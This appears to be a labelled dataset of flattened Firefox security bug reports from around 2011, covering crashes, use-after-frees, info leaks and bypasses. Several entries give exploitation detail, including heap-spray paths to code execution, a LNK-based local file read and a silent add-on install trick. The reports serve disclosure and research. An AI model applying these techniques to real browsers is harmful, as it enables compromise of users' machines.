10229140 xul messageloop run ipc\chromium\src\base\message_loop.cc 174 0012fc80 1022a1eb xul nsbaseappshell run widget\src\xpwidgets\nsbaseappshell.cpp 180 0012fc8c 1002e9fd xul nsappstartup run toolkit\components\startup\src\nsappstartup.cpp 184 0012ff34 0040133b xul xre_main toolkit\xre\nsapprunner.cpp 3485 0012ff80 004016c2 firefox wmain toolkit\xre\nswindowswmain.cpp 120 0012ffc0 7c817077 firefox tmaincrtstartup obj-firefox\memory\jemalloc\crtsrc\crtexe.c 591 0012fff0 00000000 kernel32 baseprocessstart dispatcher-use-after-free2.xul demonstrates eip control and results in the following crash 574.614 access violation code c0000005 second chance eax=0c301010 ebx=0c301021 ecx=0c301014 edx=c1c2c3c4 esi=0012eb48 edi=0012eb28 eip=c1c2c3c4 esp=0012eb0c ebp=0012ec3c iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202 c1c2c3c4 credit this vulnerability was discovered by regenrecht	11
investigate crash js_tracescript the following was reported to security m.o by rh01 z1p.biz there are several crash signatures that were observed but the worst looking one is the one in this bug s summary bp-f9041a36-322d-498e-b9bb-ef4142110419 caused by testcase2 there may be more than one bug here the rest of rh0 s email follows hello brandon thanks for your answer the modified testcase is in the attachment testcase2.html there is even a third distinct crash when starting it this testcase led to the following crashes which are to my opinion 3 distinct ones 1 bp-f9041a36-322d-498e-b9bb-ef4142110419 2 bp-5b1be6ee-555a-403e-86eb-b49832110419 3 bp-e165af98-a78b-4cd8-9ffe-a07562110419 4 bp-0ab9cf70-d4c5-47a8-82a0-5a3702110419 5 bp-489b103c-f765-4684-8d31-5a30d2110419 6 bp-660b8d86-a0f3-4b34-b2a3-fe2952110419 7 bp-178d6ac7-c5a1-4e84-89bc-a82012110419 8 bp-1863f900-69b9-4a8d-9486-0343c2110419 9 bp-675e6d6f-58a8-4ffa-b719-8b4d12110419 10 bp-bbf19bc6-44fc-465e-bdcf-2cda22110419 11 bp-18b9c507-dbed-405e-beae-1a69d2110417 12 bp-348e681b-3315-4b1d-9b45-6902d2110417 13 bp-87858153-b8d1-44a7-b7e4-d74d02110417 already inside last email crash type a 13 1 access violation execute crash type b 9 8 4 access violation read at crash type c 12 11 10 7 6 5 3 2 access violation write at crash a is maybe the most dangerous one though i do n't know exactly how to trigger all three differently here are some scenarios i tried load testcase switch on firebug crash switch on firebug load testcase sometimes a crash if no crash occurs access dom panel crash i think the worst crash type a is mostly triggered when starting firefox again after the crash sometimes it loads the tabs automatically which were opened in the last session which leads to a new crash as it tries to load the testcase aswell this is crash a firebug is automatically switched on in this case can this automatic reopening be set except in the general option tab when firefox starts please keep me informed for bugzilla i use the address rh01 z1p.biz as soon as the bug is filed can i access it over my account please let me know if you need something else to proceed i will still look if other similar testcases trigger the crashes more precisely and/or the issue can be triggered without firebug and/or exploited thank you and regards rh0	11
reproducible crash at js regexp executeinternal user-agent mozilla/5.0 x11 linux x86_64 rv:2.0.1 gecko/20100101 firefox/4.0.1 build identifier mozilla/5.0 x11 linux x86_64 rv:2.0.1 gecko/20100101 firefox/4.0.1 the crash looks like program received signal sigsegv segmentation fault in gdb x/i rip cmpw rdi rsi,2 gdb p rdi 1 140736947844760 gdb p rsi 2 2147483650 and the values varied while the testcase was being minimized reproducible always steps to reproduce 1 echo script match g m 2147483648 script rex.html 2 3 firefox rex.html actual results firefox crashes expected results firefox remains running bug sounds similar to this one but since this is cleanly reproducible and looks potentially exploitable to me filing this separately as a hidden bug to be on the safe side crash state dump at	7
crlf injection and the parsing of http headers my name is ian graham and i ’ m a senior security engineer working with citrix online recently we ’ ve been doing some research on crlf injection http response splitting attacks and we found a behavior in firefox that facilitates a specific type of attack consider a web application which is vulnerable to crlf injection via an external redirect in other words the application is configured to redirect requests for to or something similar provided that the application is not correctly filtering crlf characters an attacker could create a malicious uri that upon visiting would redirect the victim to a website of his choice in this case the venerable badgerbadgerbadger.com for example the request will yield a response that looks something like http/1.1 302 found location location content-type text/html content-length 156 date thu 05 may 2011 20:13:07 gmt the url has moved a href location here a and the client will automatically be redirected to this is a pretty standard crlf injection attack but the interesting thing here is that it only works on firefox tested on 4.0.1 i ’ ve tested with various versions of chrome and ie and they do not redirect the user to the malicious link i ’ m not super familiar with the internals of firefox but i ’ m guessing that this is because firefox parses headers in a slightly different way than ie or chrome i.e in the case where there are multiple headers with the same name ie/chrome use the first header in the response while firefox apparently uses the last i don ’ t know if this particular behavior was intended or if it ’ s just a side effect of firefox ’ s implementation and i ’ m not claiming that this is a security vulnerability per se i just wanted to bring this behavior to the attention of the team and point out that it facilitates a specific class of attacks	9
firefox 4 crashing when i try to delete emails using yahoo mail beta js mjit jaegershot user-agent mozilla/5.0 macintosh intel mac os x 10.6 rv:2.0.1 gecko/20100101 firefox/4.0.1 build identifier mozilla/5.0 macintosh intel mac os x 10.6 rv:2.0.1 gecko/20100101 firefox/4.0.1 whenever i try to delete emails from new yahoo mail beta the firefox 4 is crashing here are the crash reports reproducible always steps to reproduce 1 goto yahoo mail beta 2 goto inbox and try to delete emails by pressing delete key 3 keep deleting and firefox crashes	11
crash at js_interpret:1282 after oom with traced eleminc/propinc op the following was reported to security m.o with jit tracemonkey enabled firefox 3.6 crashes if a javascript object s value is increased/decreased by one using within a while loop and reaches a value greater than the bug is exploitable and it seems to work only on windows x86 and amd64 i tested the attached code under windows 7 64 bits windows xp 32 bits and ubuntu 10.10 64 bits i could n't identify the type of vulnerability this is an old crash report and a fresh one	11
information leakage between canvases and origins windows d2d user-agent mozilla/5.0 windows nt 6.0 rv:2.0.1 gecko/20100101 firefox/4.0.1 build identifier mozilla/5.0 windows nt 6.0 rv:2.0.1 gecko/20100101 firefox/4.0.1 information leakage between canvases and origins reproducible always steps to reproduce 1 have a canvasa which is inserted into dom tree and visible 2 draw green rect onto canvasa 3 have canvasb which is not inserted into dom tree 4 draw canvasa onto canvasb 5 draw red rect and different-origin image onto canvasa a repro implementation is attached actual results red rect and different-origin image on canvasb which has origin-clean flag true if accessed later than immediately expected results green rect and no different-origin image on canvasb which has origin-clean flag true gpu geforce 9650m gt driver version 270.61 also reproducable in ff4.0 bug does not occurs when canvasa meets any of the following conditions is not in dom tree has css display none has css visible hidden has css opacity less than 1 and the canvasa is not fully overlayed by another element	5
information leakage between canvases and origins windows d2d user-agent mozilla/5.0 windows nt 6.0 rv:2.0.1 gecko/20100101 firefox/4.0.1 build identifier mozilla/5.0 windows nt 6.0 rv:2.0.1 gecko/20100101 firefox/4.0.1 information leakage between canvases and origins reproducible always steps to reproduce 1 have a canvasa which is inserted into dom tree and visible 2 draw green rect onto canvasa 3 have canvasb which is not inserted into dom tree 4 draw canvasa onto canvasb 5 draw red rect and different-origin image onto canvasa a repro implementation is attached actual results red rect and different-origin image on canvasb which has origin-clean flag true if accessed later than immediately expected results green rect and no different-origin image on canvasb which has origin-clean flag true gpu geforce 9650m gt driver version 270.61 also reproducable in ff4.0 bug does not occurs when canvasa meets any of the following conditions is not in dom tree has css display none has css visible hidden has css opacity less than 1 and the canvasa is not fully overlayed by another element	5
array.reduceright info leak and potential code execution chris rohlf and yan ivnitskiy are giving a talk at blackhat 2011 on the security risks of jit engines rohlf the have provided a ruby sinatra server poc and the following details begin mozilla firefox 4.0.1 array.reduceright vulnerability firefox 4.0.1 contains an integer overflow that can lead to an information leak and arbitrary code execution quick reproduction steps 1 create an array object 2 set array object length to max_uint-1 3 call reduceright function on new array when the reduceright method is called on an array object instance execution transferred to array_extra in jsarray.cpp this function first determines if the argument passed to the method is a callable object such as a function that will be called for each element of the array if this test passes then the following code is executed 1 line 2740 jsarray.cpp reads in the array.length property to an unsigned integer jsuint length if js_getlengthproperty cx obj length return js_false 2 line 2767 jsarray.cpp start end and step are initialized but reversed if the method called is reduceright these variables are all signed integers jsint start 0 end length step 1 switch mode case reduce_right start length 1 end 1 step 1 3 a call to getelement is made on line 2784 below is the function prototype for the getelement function getelement jscontext cx jsobject obj jsdouble index jsbool hole value vp this first call to getelement can be avoided by providing 2 arguments to the reduceright call the call to getelement on line 2839 is the call we want to reach this call lies within a giant for loop that iterates over each element of the array calling the javascript callback provided as the first argument to reduceright 4 now that a controllable signed index value is passed into getelement the following if statement is executed js_assert index 0 not executed unless debug build if obj isdensearray index obj getdensearraycapacity vp obj getdensearrayelement uint32 index ismagic js_array_hole hole js_false return js_true the call to obj isdensearray should succeed the return value of obj getdensearraycapacity should return 16 the call to vp obj getdensearrayelement uint32 index ismagic js_array_hole boils down to a call to getslot index on line 334 of jsobjinlines.h this getslot index call is on 686 of jsobj.h basically executes obj slots attacker_controlled_index the vp pointer now points out of bounds from the obj slots array if this does n't point to a mapped page then the process will crash if the page is mapped then we read this value and return it as the value of that location in the array vp is actually a value class instance which contains a jsval_layout union which means our leaked value may be interpreted as an integer string or object value continuing down the vulnerable code path 5 back in array_extra the following code is executed for jsint i start i end i step jsbool hole ok js_check_operation_limit cx getelement cx obj i hole tvr.addr line 2839 of jsarray.cpp shown in 4 uintn argi 0 if reduce_mode mode setup the arguments to reduceright session argi vp prev session argi tvr.value current our information leak session argi int32value i index session argi objv array do the call ok session.invoke cx invoke the javascript callback so now in our reduceright callback function we have a leaked value current code execution is possible via heap spray we simply spray a bunch of fake value s tagged as type jsval_type_object and control their asptr and ptr members which will lead to all sorts of exploitable conditions below is a working ruby sinatra server that will demonstrate a reliable information leak and somewhat reliable code execution when run under 32bit linux this poc should leak many libxul pointers stored just beneath the obj slots array in memory heres the output of gdb that proves code execution is possible once the value is controlled by the attacker in the reduceright callback we trigger a method off the object such as setting an element and execution is transferred to the jit d setelem method which calls obj setproperty gdb bt 5 0 in 1 in setproperty f at builds/slave/rel-2.0-lnx-bld/build/js/src/jsobj.h:1232 2 js mjit stubs setelem 0 f at builds/slave/rel-2.0-lnx-bld/build/js/src/methodjit/stubcalls.cpp:567 3 in 4 in js mjit entermethodjit cx fp code stacklimit at builds/slave/rel-2.0-lnx-bld/build/js/src/methodjit/methodjit.cpp:749 more stack frames follow gdb i r eax 1323858304 ecx 1 edx 118230028 ebx 36186036 esp ebp esi 1292898040 edi 202116108 eip eflags pf if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51 disassembly of setelement once edx is controlled js mjit stubs setelem 0 js vmframe 152 mov edx edx edx js mjit stubs setelem 0 js vmframe 155 test edx edx edx js mjit stubs setelem 0 js vmframe 157 je js mjit stubs setelem 0 js vmframe 344 js mjit stubs setelem 0 js vmframe 163 lea esp eax js mjit stubs setelem 0 js vmframe 167 mov eax esp js mjit stubs setelem 0 js vmframe 171 mov esp eax js mjit stubs setelem 0 js vmframe 175 movl esp js mjit stubs setelem 0 js vmframe 183 mov ecx esp js mjit stubs setelem 0 js vmframe 187 mov edi esp js mjit stubs setelem 0 js vmframe 191 mov eax esp js mjit stubs setelem 0 js vmframe 194 call edx call setproperty this vulnerability was discovered and researched by chris rohlf of matasano security this has only been tested on 32bit ubuntu 11.04 with firefox 4.0.1 end	11
named frames can shadow window.location sometimes location is a non-configurable property so if you look up window.location before there is a frame name location you will always get the right window.location after that but if you look it up for the first time after such a frame exists you will get the window for the frame effectively the fix for bug 541530 can be circumvented by this means	2
growatomtable return code not checked crash due to angle michael jordon of context is sent this bug to us based on testing on a winxp sp3 machine and firefox 4.0.1 i believe based on the other bug he writes	7
string crash found while fuzzing webgl shaders michael jordon of context is submitted this javascript string crash he found while testing webgl in firefox 4.0.1 on winxp he can not reproduce the bug in a nightly build but does n't know if that means we ve fixed it or the crash is just moved a bit from michael this might be related to webgl but i do n't think it actually is it was just exposed when doing fuzzing against the shader compiler it is n't clear if this has a security implication although it looks possibly like some memory is getting overwritten causing the issues to occur the bug seems to manifest in two different ways both of them when calling into nspromiseflatstring nspromiseflatstring the first manifestation ends up with a call to memcpy where the source pointer is too small for the number of bytes it is supposed to be copying so crashes on a read av this is string crash 1 the second is a stack overflow where the code calls into the function xul nsastring_internal assign which seems to think it can optimise the string operation by calling back into itself which causes an infinite loop and eventually the stack runs out this is string crash 2 which one occurs seems to depend on what has already been loaded at the time the poc minimal_crash.html exhibits the bug on 4.0.1 on xp sp3 it does n't seem to crash the latest nightly build however slight changes to the javascript which does n't change function just form seems to also stop the crash so it might just be the nightly build is rebuilt in such a way that memory layout is sufficiently different to stop the underlying bug or it could be fixed	11
arbitrary file directory read via lnk files on windows share if a user can be persuaded to visit an html file hosted on a public windows share see below then that page can use lnk files to read arbitrary files and directory listings from their machine imagine we have index.html and foo.lnk in the same directory with foo.lnk pointing to c boot.ini the html file is loaded via a file url then loads foo.link into an iframe the contents of boot.ini are displayed but document.location of the iframe is still foo.lnk however if the outer page tries to access the iframe it gets a permission denied error as firefox still seems to realise that the outer page and inner page are from different origins/directories the trick is to have two link files baz.lnk index.html foo.lnk c boot.ini first we load baz.lnk then replace baz.lnk with foo.lnk the html page then loads baz.lnk i.e itself using xhr or an iframe because the url of the requesting page matches the page loaded firefox assumes they re the same origin and allows the contents to be read both files and directories can be read in this manner my poc uses static lnk files to read some system directories and the firefox profile.ini file however it would be possible to traverse the whole filesystem by grabbing a directory listing and then dynamically generating lnk files on the server there are various method to get the user to load content from a public share e.g file myhost.com/share/index.html 1 use a java applet to force a drop of the url see bug 546909 poc uses this 2 put an innocent looking unhyperlinked http url on the page and get the user to copy/paste it into the location bar when the user has selected the url sneakily change the current selection to the file url so that gets copied instead poc also has this as an alternative option 3 possibly send the file url in an email i ve not really looked into this but i seem to recall outlook will open up myhost.com\share\index.html in firefox if it s the default browser this attack could either work within an intranet or possibly over the internet providing your isp/corporate firewall does n't block the relevant ports my isp does but i know not all do i ve attached the poc as a zip file as i do n't currently have anywhere to host this publically it s been tested on a few windows xp machines not sure if win7 has any extra security measures to prevent things like this finally this bug was found in my own time so i promise it wo n't be blogged tweeted or publicised in any way before it s fixed	2
holding enter allows arbitrary extension installation it is possible to install an arbitrary xpi without user s consent if the user holds enter on a malicious website containing a specially crafted javascript code there are 2 layers of protection against an unauthorized installation of extensions 1 the principal of the opener is checked against whitelisted domains that are allowed to download the plugin without asking if the domain is not trusted the user is asked to allow to download the plugin 2 when the plugin is downloaded the user is asked to confirm the installation the first protection can be circumvented by creating a hidden embed element containing an arbitrary xpi as its pluginspage parameter the attacker can focus this element while the user holds enter causing a number of plugin finder service windows to appear the first window focuses the cancel button and will just close but all the subsequent ones will set focus on the manual install button directing to the malicious xpi as soon as the user releases the key the browser will start launching multiple windows with the provided url the windows will have a chromewindow object as their opener so the user will not be asked to allow to download a plugin the second protection can be bypassed due to a logic error in amwebinstalllistener.js when no window-watcher is registered in services this will throw services.ww.openwindow this.window chrome mozapps/content/xpinstall/xpinstallconfirm.xul null chrome modal centerscreen args with the following message in the console warning warn addons.manager installlistener threw exception when calling ondownloadended typeerror services.ww is undefined source file resource gre/components/amwebinstalllistener.js line 170 when the confirmation dialog fails to open the installation will commence as though the user clicked install getting the browser into a state in which services.ww is permanently undefined can be achieved with no user interaction by using a modified version of on a signed website exploiting it locally will likely bring about corrupt windows and a lot of errors in the console but services.ww will be defined on a remote signed website with the try-catch-inside-eval recursion performed during page load after an alert dialog which prevents too much recursion error from occuring it fails silently and services.ww remains undefined for the whole browsing session ie firefox will not ask to confirm a plugin installation until the user restarts the browser the only mitigating factor is that if services.ww was defined earlier in the browser session the exploit may fail and corrupt windows will appear hence point 2 in the steps described below after opening windows to import the certificate this was noticed by zach hoffman in c37 but the implications there were reverse there may be other ways to wind up with services.ww undefined but those should be safe as long as the plugin installation is stopped when xpinstallconfirm.xul fails to open reproducible always as long as services.ww was n't defined earlier in the browsing session steps to reproduce 1 import x509.cert for software makers identification 2 close the browser and reopen after the process shuts down 3 open jar see comment 1 4 press and hold enter actual results the plugin is automatically downloaded and installed expected results the plugin should neither be downloaded nor installed without user s consent verified to work with firefox 5.0.1 on windows 7 sp1 64-bit and windows xp sp3 32-bit	2
this script reliably crashes firefox 5 on linux mac and windows by streaming an ogg file through a proxy user agent mozilla/5.0 x11 linux x86_64 applewebkit/534.30 khtml like gecko chrome/12.0.742.124 safari/534.30 steps to reproduce connect to a proxyserver stream a specific ogg file to an html5 player then i seek to a part that has not yet been loaded actual results on firefox 4 this works on 5 and 6 i get a crossplatform crash windows linux mac a segfault expected results no segfault	11
webgl crash in getuniformlocation with too long uniform identifiers user agent mozilla/5.0 macintosh intel mac os x 10.6 rv:5.0.1 gecko/20100101 firefox/5.0.1 build id 20110707182747 steps to reproduce i played arround with webgl and suddenly my browser crashed if the string parameter is too long in the function getuniformlocation the browser is going to crash i created a poc actual results the browser crashed	11
sigsegv while profiling page with many functions js debugging user agent mozilla/5.0 macintosh intel mac os x 10_6_8 applewebkit/534.30 khtml like gecko chrome/12.0.742.122 safari/534.30 steps to reproduce open many66000.html 2 open firebug 3 do while not crash and press continue on long running script 3a press ok in hello box 3b press profile actual results process firefox-bin 6702 path applications/firefox.app/contents/macos/firefox-bin identifier org.mozilla.firefox version 5.0.1 5.0.1 code type x86-64 native parent process launchd 185 date/time 2011-07-27 11:38:37.194 0200 os version mac os x 10.6.8 10k540 report version 6 interval since last report 949111 sec crashes since last report 962 per-app interval since last report 12453 sec per-app crashes since last report 9 anonymous uuid a20874ec-7280-445c-9882-755000f0127c exception type exc_bad_access sigbus exception codes kern_protection_failure at crashed thread 0 dispatch queue com.apple.main-thread thread 0 crashed dispatch queue com.apple.main-thread 0 libsystem.b.dylib tiny_free_list_add_ptr 124 1 libsystem.b.dylib tiny_malloc_from_free_list 1196 2 libsystem.b.dylib szone_malloc_should_clear 242 3 libsystem.b.dylib malloc_zone_malloc 82 4 libsystem.b.dylib malloc 44 5 libmozalloc.dylib moz_xmalloc 12 6 xul xpc_localizecontext jscontext 75748 7 xul dumpjsvalue 81591 8 xul dumpjsvalue 83830 9 xul xpc_localizecontext jscontext 43033 10 xul xpc_localizecontext jscontext 18025 11 xul nsxptcstubbase stub249 533 12 xul ns_invokebyindex_p 955 13 xul jsd_debuggeronforuser 49567 14 0 5196163600 15 0 4959657904 16 0 4798044760 17 0 4828980384 18 0 4792489344 19 0 4338259920 20 0 4829058368 21 0 4338637008 22 0 4338629920 23 0 4829122320 24 0 4829174640 25 0 4829202128 26 0 4829234064 27 0 4829246800 28 0 4829254624 29 0 4829269728 30 0 4829288320 31 0 4829541776 32 0 4829556832 33 0 4829557488 34 0 4829558960 35 0 4829559088 36 0 4829559280 37 0 4829559952 38 0 4829560400 39 0 4829561248 40 0 4829561440 41 0 4829561760 42 0 4829562608 43 0 4829563632 44 0 4829564176 45 0 4829495968 46 0 4829564912 47 0 4829565840 48 0 4829566032 49 0 4829566880 50 0 4829567104 51 0 4829569680 52 0 4829569264 53 0 4829569488 54 0 4829571696 55 0 4829572384 56 0 4829574528 57 0 4829574128 58 0 4829574384 59 0 4829575584 60 0 4829576512 61 0 4829576784 62 0 4829577360 63 0 4829578176 64 0 4829578560 65 0 4829578864 66 0 4829579360 67 0 4829581184 68 0 4829582368 69 0 4829580768 70 0 4829582240 71 0 4829584784 72 0 4829584880 73 0 4829585104 74 0 4829585232 75 0 4829585904 76 0 4829586128 77 0 4829586976 78 0 4829587216 79 0 4829587760 80 0 4829588416 81 0 4829589328 82 0 4829589600 83 0 4829590192 84 0 4829590896 85 0 4829592256 86 0 4829592416 87 0 4829592928 88 0 4829593824 89 0 4829594480 90 0 4829594640 91 0 4829596288 92 0 4829595696 93 0 4829596928 94 0 4829597024 95 0 4829597440 96 0 4829598064 97 0 4829600272 98 0 4829600480 99 0 4829601280 100 0 4829601520 101 0 4829602240 102 0 4829602688 103 0 4829604016 104 0 4829605264 105 0 4829605504 106 0 4829606096 107 0 4829607104 108 0 4829608960 109 0 4829609344 110 0 4829610224 111 0 4829610496 112 0 4829611264 113 0 4829611872 114 0 4829612592 115 0 4829612784 116 0 4338370352 117 0 4338370512 118 0 4829615536 119 0 4829614496 120 0 4804933392 121 0 4804855344 122 0 4801952816 123 0 4802077248 124 0 4802048144 125 0 4809295632 126 0 4809535904 127 0 4800126080 128 0 4801864832 129 0 4801793968 130 0 4801794064 131 0 4801805712 132 0 4801805808 133 0 4801807600 134 0 4801807696 135 0 4801808608 136 0 4801819632 137 0 4802087696 138 0 4801761632 139 0 4801761728 140 0 4801769296 141 0 4801773472 142 0 4801773648 143 0 4801784944 144 0 4801708192 145 0 4801708352 146 0 4801714096 147 0 4801714192 148 0 4801718320 149 0 4801745808 150 0 4801745984 151 0 4801750688 152 0 4801753632 153 0 4801757616 154 0 4805322272 155 0 4805322368 156 0 4327010432 157 0 4802131312 158 0 4805141936 159 0 4805142032 160 0 4802130368 161 0 4802181088 162 0 4802118704 163 0 4802118528 164 0 4802189104 165 0 4802178384 166 0 4802176480 167 0 4802176576 168 0 4802174304 169 0 4802174400 170 0 4802175248 171 0 4802175344 172 0 4802143952 173 0 4802209168 174 0 4802206544 175 0 4802206368 176 0 4802208992 177 0 4804717392 178 0 4804714560 179 0 4804714704 180 0 4804704960 181 0 4804703968 182 0 4804704064 183 0 4804701136 184 0 4804701280 185 0 4804697408 186 0 4804697504 187 0 4804696512 188 0 4804761184 189 0 4804761312 190 0 4804753936 191 0 4804740864 192 0 4804741008 193 0 4804738976 194 0 4804730656 195 0 4804730752 196 0 4804724656 197 0 4804724816 198 0 4804830352 199 0 4804830496 200 0 4804906880 201 0 4804904944 202 0 4804905040 203 0 4804900192 204 0 4804900320 205 0 4804890736 206 0 4804887152 207 0 4804886144 208 0 4804886320 209 0 4804884608 210 0 4804880752 211 0 4804880896 212 0 4804940288 213 0 4804940432 214 0 4804936544 215 0 4804931280 216 0 4804928336 217 0 4804922464 218 0 4804915824 219 0 4804915968 220 0 4804955696 221 0 4804954752 222 0 4804954896 223 0 4804949712 224 0 4804948704 225 0 4804945824 226 0 4804945920 227 0 4804943808 228 0 4804943952 229 0 4804984464 230 0 4804976784 231 0 4804976880 232 0 4804971728 233 0 4804970736 234 0 4804970832 235 0 4804969792 236 0 4804969936 237 0 4804968896 238 0 4804966288 239 0 4804966432 240 0 4804961168 241 0 4804960224 242 0 4804960320 243 0 4805004960 244 0 4805005056 245 0 4805001456 246 0 4805001600 247 0 4804998976 248 0 4804996064 249 0 4804996240 250 0 4804995232 251 0 4804990528 252 0 4804989536 253 0 4804989696 254 0 4805027632 255 0 4805025088 256 0 4805022464 257 0 4805019856 258 0 4805019952 259 0 4805016144 260 0 4805015264 261 0 4805013312 262 0 4805014192 263 0 4805047216 264 0 4805045328 265 0 4805045424 266 0 4805037728 267 0 4805028480 268 0 4805028576 269 0 4805033200 270 0 4805071072 271 0 4805061616 272 0 4805062496 273 0 4805062592 274 0 4805070176 275 0 4805068512 276 0 4805068688 277 0 4805060592 278 0 4805058080 279 0 4805051936 280 0 4805052064 281 0 4805049200 282 0 4805089712 283 0 4805089808 284 0 4805080640 285 0 4805079696 286 0 4805079792 287 0 4805369920 288 0 4809018384 289 0 4809018480 290 0 4801735888 291 0 4801878848 292 0 4802116176 293 0 4802116320 294 0 4802437024 295 0 4802437216 296 0 4804745360 297 0 4804879792 298 0 4801798288 299 0 4804902608 300 0 4805117888 301 0 4808883520 302 0 4808883696 303 0 4801779152 304 0 4802329120 305 0 4802329264 306 0 4802329856 307 0 4805134704 308 0 4805134800 309 0 4805372160 310 0 4808826560 311 0 4808826752 312 0 4801833392 313 0 4801839952 314 0 4801840160 315 0 4801860624 316 0 4801903088 317 0 4801898368 318 0 4801898512 319 0 4801917280 320 0 4801917408 321 0 4801911024 322 0 4801737984 323 0 4801943696 324 0 4801738080 325 0 4801961952 326 0 4802103040 327 0 4802128816 328 0 4802128912 329 0 4802129008 330 0 4802244640 331 0 4802317120 332 0 4802365568 333 0 4802365664 334 0 4802433744 335 0 4802433840 336 0 4804594400 337 0 4804754784 338 0 4804754880 339 0 4804791008 340 0 4804791216 341 0 4804813872 342 0 4804885088 343 0 4804881776 344 0 4804899248 345 0 4804899344 346 0 4804929264 347 0 4805009408 348 0 4804993984 349 0 4804994144 350 0 4805051056 351 0 4805078832 352 0 4805078928 353 0 4802003472 354 0 4809405072 355 0 4809405168 356 0 4809220576 357 0 4805068976 358 0 4801725104 359 0 4801750048 360 0 4801826768 361 0 4801725200 362 0 4809137136 363 0 4802330608 364 0 4809401136 365 0 4809136960 366 0 4809400912 367 0 4866872880 368 0 4866872544 369 0 4866872720 370 0 4866874736 371 0 4866874944 372 0 4866875648 373 0 4866875360 374 0 4866875536 375 0 4866876752 376 0 4866877088 377 0 4866877264 378 0 4866877648 379 0 4866877984 380 0 4866878368 381 0 4866878848 382 0 4866879936 383 0 4866881056 384 0 4866881152 385 0 4866881440 386 0 4866881904 387 0 4866882080 388 0 4866883776 389 0 4866883520 390 0 4866884160 391 0 4866884464 392 0 4866884704 393 0 4866886112 394 0 4866886352 395 0 4866886816 396 0 4866888096 397 0 4866889216 398 0 4865435056 399 0 4865427536 400 0 4865436400 401 0 4865436496 402 0 4865438912 403 0 4865439504 404 0 4865436016 405 0 4865436240 406 0 4865435904 407 0 4865442656 408 0 4865443200 409 0 4865443968 410 0 4865443376 411 0 4865441280 412 0 4865447360 413 0 4865447696 414 0 4865448048 415 0 4865448480 416 0 4865448912 417 0 4865449344 418 0 4865449776 419 0 4865450144 420 0 4865450512 421 0 4865450880 422 0 4865451248 423 0 4865451648 424 0 4865452128 425 0 4865452656 426 0 4865453504 427 0 4865454144 428 0 4865454672 429 0 4865455136 430 0 4865455504 431 0 4865455872 432 0 4865456240 433 0 4865456608 434 0 4865456976 435 0 4865457344 436 0 4865457712 437 0 4865624192 438 0 4865627312 439 0 4865582128 440 0 4865584368 441 0 4865583120 442 0 4865585056 443 0 4865585248 444 0 4865578992 445 0 4865578416 446 0 4865587088 447 0 4865586128 448 0 4865581152 449 0 4865580912 450 0 4865627184 451 0 4865587584 452 0 4865587792 453 0 4865587984 454 0 4865588192 455	11
ogg crash nsoggreader readheaders user agent mozilla/5.0 x11 u linux x86_64 c applewebkit/531.2 khtml like gecko safari/531.2 epiphany/2.30.6 steps to reproduce ran firefox on an ogg file it seems like firefox crashes on any ogg file where the beginning of stream flag is set in the second page of a stream i attached one example actual results firefox seg faults expected results firefox should just not play the video like it normally does for corrupted videos rather than seg faulting	11
exploitable use after free shlwapi iunknown_queryservice under windows 7 32-bit a crash can be caused with the attached code the simplest poc code includes a parent and one child window the parent window spawns the child and after a short delay invokes a file open dialog from the child then the parent closes the child window this causes an exploitable crash pre-requisites javascript enabled ability to create at least one pop-up window not a tab browser.link.open_newwindow 2 or a popup blocker bypass firefox 5 6 or nightly other versions not tested in the basic poc the faulting instruction is a call to freed memory shlwapi iunknown_queryservice 76d842a1 ff11 call dword ptr ecx ds:0023 feeefeee note that is what is placed into windows memory which has been heapfree d we are also attaching an exploit poc this uses two child windows due to certain allocation sequences it turns out that ends up being in ecx about 30 of the time believe it or not this address comes from the binary representation of the guid for my computer 20d04fe0-3aea-1069-a2d8-08002b30309d which ends up in the memory where ecx gets loaded so a stable pointer value turns up in ecx quite often on 32-bit windows 7 a heap spray can arrange for page-aligned data to turn up at with more work on heap feng shui i.e using javascript to control memory allocations it may be possible to get into ecx more reliably or in fact directly control the value which goes into ecx the exploit poc should show at the top of the call stack we have got code execution on windows 7 with dep turned off it is also possible to get this to work on stock windows 7 using a heap-based rop we were only able to reproduce this issue on windows 7 32-bit xp and win7 64 did not crash non-windows operating systems should not be vulnerable	9
random video memory grabbed into webgl cube map textures on mac os including on 10.7.1 on intel gpus user agent mozilla/5.0 macintosh intel mac os x 10_6_8 applewebkit/535.1 khtml like gecko chrome/13.0.782.220 safari/535.1 steps to reproduce i loaded this webgl demo in firefox 6.0.1 actual results the background cube texture does not render correctly what i see is randomly garbled artefacts of parts of my screen see attached screenshots the effect is very similar to what has already been reported in this bug just that i run a different os version and a different graphics card note that i can reproduce this issue even after rebooting my machine and that chrome 13 shows the exact same problem suggesting that it is a low level problem possibly with the graphics card drivers some info on my hardware hardware overview model name macbook pro model identifier macbookpro8,1 processor name intel core i5 processor speed 2.3 ghz number of processors 1 total number of cores 2 l2 cache per core 256 kb l3 cache 3 mb memory 4 gb boot rom version system software overview system version mac os x 10.6.8 10k549 kernel version darwin 10.8.0 boot volume macintosh hd boot mode normal secure virtual memory	5
universal xss likely with multibyte charset e.g japanese sites user agent mozilla/5.0 windows nt 6.0 rv:7.0 gecko/20100101 firefox/7.0 build id 20110916091512 steps to reproduce json containing broken mbcs sequence allows hijacking by attacker attacker can read the secret contents of json across the domain if attacker can control some field in it poc is here actual results byte sequence is invalid for shift_jis therefore it should be treated as 2 letters such as u+fffd u+0022 but firefox treats it as 1 letter so double quote trailing invalid lead byte is vanished expected results treat invalid byte sequence correctly like as utf-8 in utf-8 is treated as 2 lettes u+fffd u+0022	9
attributechildremoved use-after-free zdi-can-1413 zdi-can-1413 mozilla firefox attributechildremoved use-after-free remote code execution vulnerability cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details version s tested mozilla firefox 8.0.1 platform s tested windows xp sp3 vulnerability details version s tested mozilla firefox 8.0.1 platform s tested windows xp sp3 vulnerability details under certain circumstances removal of child nodes from the nsdomattribute can allow for a child to still be accessible after removal due to a premature notification of attributechildremoved please observe the code below from base/src/nsdomattribute.cpp void nsdomattribute doremovechild bool anotify if anotify nsnodeutils attributechildremoved this mchild static_cast nstextnode mchild unbindfromattribute ns_release mchild mfirstchild nsnull as can be seen above a call to the function attributechildremoved happens before mfirstchild is set to null registered mutation observers implementing interface nsimutationobserver2 will have callback function attributechildremoved since mfirstchild is not set to null until after this call is made this means the removed child will be accessible after it has been removed this use-after-free allows for arbitrary code execution by an attacker the code below can used to trigger and demonstrate the vulnerability begin code snip html 